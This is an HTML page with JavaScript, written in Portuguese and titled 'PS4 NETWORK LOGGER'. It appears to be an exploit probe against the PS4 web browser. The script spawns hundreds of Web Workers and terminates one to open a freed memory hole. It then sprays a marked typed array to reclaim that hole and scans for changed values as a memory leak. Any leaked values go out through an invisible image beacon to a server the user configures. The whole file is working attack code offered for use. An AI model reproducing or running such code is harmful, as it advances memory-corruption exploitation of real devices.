<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 NETWORK LOGGER</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
        #status { font-size: 2em; border: 1px solid #555; padding: 20px; margin: 20px 0; background: #111; }
        .sending { color: #ff0; animation: blink 0.1s infinite; }
        @keyframes blink { 0% {opacity:1} 50% {opacity:0.5} 100% {opacity:1} }
    </style>
</head>
<body>

    <h1>NETWORK LOGGER (ANDROID)</h1>
    <div id="status">EDITAR IP NO SCRIPT ANTES DE USAR!</div>

    <script>
        // --- CONFIGURAÇÃO (EDITE AQUI) ---
        // Coloque o IP do seu celular Android aqui
        const SERVER_IP = "192.168.1.3"; // <--- MUDE ISSO
        const SERVER_PORT = "8000";
        
        const TARGET_THREADS = 418; // Ponto de congelamento
        const STRUCT_SIZE = 128; // 512 bytes
        const PATTERN = 0xCAFEBABE;

        let workers = [];
        let sensorArray = new Uint32Array(STRUCT_SIZE);
        let hasLeaked = false;
        
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        function start() {
            if(SERVER_IP.includes("XX")) {
                alert("EDITE O IP NO ARQUIVO HTML!");
                return;
            }
            
            // Preenche sensor
            sensorArray.fill(PATTERN);
            // Marcas
            sensorArray[0] = 0x11111111; 
            sensorArray[STRUCT_SIZE-1] = 0x99999999;

            document.getElementById('status').innerText = `ALVO: ${SERVER_IP}:${SERVER_PORT}\nSUBINDO THREADS...`;
            
            // Teste de conexão inicial
            logToAndroid("INICIO_DO_TESTE");
            
            createThreads();
        }

        function createThreads() {
            let i = setInterval(() => {
                if (workers.length < TARGET_THREADS) {
                    workers.push(new Worker(url));
                    if(workers.length % 50 === 0) document.getElementById('status').innerText = `THREADS: ${workers.length}...`;
                } else {
                    clearInterval(i);
                    document.getElementById('status').innerText = "CONGELANDO E ESCANEANDO...";
                    document.getElementById('status').className = "sending";
                    
                    // Loop de Scan Ultra-Rápido
                    setInterval(scanAndSend, 10); 
                    
                    // Gatilho
                    triggerFreeze();
                }
            }, 30);
        }

        function triggerFreeze() {
            const w = new Worker(killerUrl);
            w.terminate();
            
            // Tenta ocupar o buraco com nosso sensor
            window.targetHole = new Uint32Array(STRUCT_SIZE);
            window.targetHole.set(sensorArray);
        }

        function scanAndSend() {
            if(hasLeaked) return; // Envia apenas o primeiro para ser rápido

            const arr = window.targetHole;
            if (!arr) return;

            for(let i=0; i < STRUCT_SIZE; i++) {
                // Procura alteração
                if (arr[i] !== PATTERN && arr[i] !== 0x11111111 && arr[i] !== 0x99999999) {
                    const val = arr[i] >>> 0;
                    if (val !== 0) {
                        const hex = val.toString(16).padStart(8, '0');
                        
                        // ENVIAR IMEDIATAMENTE
                        hasLeaked = true;
                        document.body.style.backgroundColor = "#fff"; // Flash visual
                        
                        // Técnica "Image Beacon" (Mais rápida que fetch, ignora CORS)
                        // Formato: http://192.168.1.15:8000/LEAK_FOUND_FFFFFFFF826C...
                        logToAndroid(`LEAK_OFFSET_${i*4}_VAL_${hex}`);
                        
                        // Tenta enviar mais alguns vizinhos
                        if(i+1 < STRUCT_SIZE) {
                            const nextVal = arr[i+1] >>> 0;
                            logToAndroid(`NEXT_VAL_${nextVal.toString(16)}`);
                        }
                    }
                }
            }
        }

        function logToAndroid(data) {
            // Cria uma imagem invisível que carrega uma URL do nosso servidor
            // O servidor vai registrar o "Erro 404" com o nome do dado, que é o que queremos.
            const img = new Image();
            img.src = `http://${SERVER_IP}:${SERVER_PORT}/${data}`;
        }

        setTimeout(start, 2000);

    </script>
</body>
</html>


